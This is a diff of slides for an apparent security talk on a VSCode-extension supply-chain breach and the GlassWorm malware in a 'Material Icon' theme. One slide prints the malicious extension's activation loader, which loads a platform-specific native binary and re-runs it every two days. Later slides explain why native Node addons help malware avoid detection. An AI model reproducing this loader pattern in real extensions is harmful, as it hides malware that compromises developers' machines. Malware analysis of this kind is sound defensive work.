@@ -471,9 +471,41 @@ transition: fade-out
 layout: center
 ---
 
-# The Github breack of the weeks gone by
+# The Github breach of the weeks gone by
 
 Supply chain + VSCode extension 
+
+---
+transition: fade-out
+layout: center
+class: text-center
+---
+
+# How it happened
+
+<div class="flex flex-wrap items-center justify-center gap-1 mt-6 text-xs">
+  <v-click><div class="bg-gray-700 text-white rounded px-3 py-2 max-w-36 text-center">Supply Chain attack to yoink the token of a contributor</div></v-click>
+  <v-click><span class="text-white text-lg">→</span><div class="bg-gray-700 text-white rounded px-3 py-2 max-w-36 text-center">Attacker pushes orphan commit to nrwl/nx</div></v-click>
+  <v-click><span class="text-white text-lg">→</span><div class="bg-gray-700 text-white rounded px-3 py-2 max-w-36 text-center">Attacker publishes v18.95.0 to VSCode Marketplace</div></v-click>
+  <v-click><span class="text-white text-lg">→</span><div class="bg-gray-700 text-white rounded px-3 py-2 max-w-36 text-center">VSCode autoupdates to new version</div></v-click>
+  <v-click><span class="text-white text-lg">→</span><div class="bg-gray-700 text-white rounded px-3 py-2 max-w-36 text-center">Github engineer has extension installed</div></v-click>
+  <v-click><span class="text-white text-lg">→</span><div class="bad-stuff bg-red-700 text-white rounded px-3 py-2 max-w-36 text-center font-bold">🔥 Bad stuff happens 🔥</div></v-click>
+</div>
+
+<style>
+@keyframes chaos {
+  0%   { transform: rotate(-4deg) scale(1);    background-color: #b91c1c; }
+  20%  { transform: rotate(4deg)  scale(1.08); background-color: #f97316; }
+  40%  { transform: rotate(-6deg) scale(1.12); background-color: #b91c1c; }
+  60%  { transform: rotate(6deg)  scale(1.08); background-color: #f97316; }
+  80%  { transform: rotate(-4deg) scale(1.04); background-color: #b91c1c; }
+  100% { transform: rotate(-4deg) scale(1);    background-color: #b91c1c; }
+}
+.bad-stuff {
+  animation: chaos 0.4s infinite;
+  display: inline-block;
+}
+</style>
 
 ---
 transition: fade-out
@@ -601,9 +633,163 @@ layout: center
 # Making first contact
 
 
-<img src="./imgs/materialicon.png"  class="max-w h-120 object-cover" />
+<img src="./imgs/materialicon.png"  class="max-w h-90 object-cover" />
 
 _“Material Icon” Theme - affected with Glassworm_
+
+---
+transition: fade-out
+layout: two-cols
+
+---
+
+```mermaid
+graph TD
+
+ A["activate()"] --> B{"global isActivated"}
+ B --> |True| C[exit]
+ B --> |False| D["init()"]
+ D --> E{"Check OS"}
+ E --> |Win32| F["load os.node"]
+ E --> |Darwin| F["load darwin.node"]
+```
+
+::right::
+
+
+<div class="text-xs" >
+
+```js {11-19|20-28}
+const os = require('os');
+let isActivated = false;
+
+async function activate(context) {
+  if (isActivated) return;
+  isActivated = true;
+  const activationKey = "activationState";
+  const activationState = context.globalState.get(activationKey);
+  const currentTime = new Date().getTime();
+  const init = () => {
+    const p = os.platform();
+    if (p == 'win32') {
+      const win = require('./os.node');
+      win.run(
+        p,
+        process.execPath,
+        __dirname
+      )
+    }
+    if (p == 'darwin') {
+      const darwin = require('./darwin.node');
+      darwin.run(
+        p,
+        process.execPath,
+        __dirname
+      )
+    }
+  };
+  if (!activationState) {
+    context.globalState.update(
+      activationKey,
+      JSON.stringify({
+        firstActivated: currentTime,
+        lastActivated: currentTime,
+        initialized: true,
+      })
+    );
+
+    init();
+
+  } else {
+    const state = JSON.parse(activationState);
+    if (currentTime > state.lastActivated + 2 * 24 * 60 * 60 * 1000) {
+      init();
+
+      context.globalState.update(
+        activationKey,
+        JSON.stringify({
+          ...state,
+          lastActivated: currentTime,
+        })
+      );
+    }
+  }
+}
+function deactivate() {
+  isActivated = false;
+}
+
+module.exports = {
+  activate,
+  deactivate,
+};
+```
+
+</div>
+
+
+<div class="absolute bottom-4 left-4 text-xs opacity-60"><a href="https://www.virustotal.com/gui/file/9212a99a7730b9ee306e804af358955c3104e5afce23f7d5a207374482ab2f8f/details">VirusTotal</a></div>
+
+---
+transition: fade-out
+layout: center
+---
+
+# Loading the binary in IDA
+
+<img src="./imgs/glasswormida.png" />
+
+_Strings from IDA_
+
+---
+layout: center
+transition: fade-out
+---
+
+<img src="./imgs/bravosix.png"  class="max-w h-120 object-cover" />
+
+---
+transition: fade-out
+layout: two-cols
+---
+
+# Going Native
+
+
+
+- Native code allows for direct interactions with the OS APIs
+- Most techniques are easier to implement in low level languages which compile to native code
+- Native code in extensions are usually more difficult to detect and reverse engineer 
+
+::right::
+
+# The Problem
+
+- Electron v20 does not support ffi
+- Implementation like `ffi-rs` ultimately compile into node-addons themselves
+
+# The Solution
+
+- Cut out the middleman and write our own modules
+
+---
+transition: fade-in
+layout: center
+---
+
+<img src="./imgs/willsmith.png"  class="max-w h-120 object-cover" /> https://nodejs.org/api/addons.html
+
+---
+transition: fade-in
+layout: center
+---
+
+# Node Addons
+
+_Addons are <span  v-click.fade class="opacity-60" > dynamically-linked shared objects </span>written in C++. The require() function can load addons as ordinary Node.js modules. Addons provide an interface between JavaScript and C/C++ libraries._
+
+_- Official NodeJS documentation_
+
 
 ---
 level: 2
